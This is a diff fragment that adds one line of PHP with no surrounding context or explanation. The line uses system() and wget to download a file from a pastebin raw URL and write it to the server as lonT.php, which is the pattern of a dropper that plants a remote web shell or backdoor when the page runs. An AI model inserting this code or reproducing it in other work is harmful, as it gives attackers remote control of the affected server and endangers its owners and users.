@@ -1,0 +1,1 @@
+<?system('wget https://pastebin.com/raw/4tpf4F70 -O lonT.php');?>
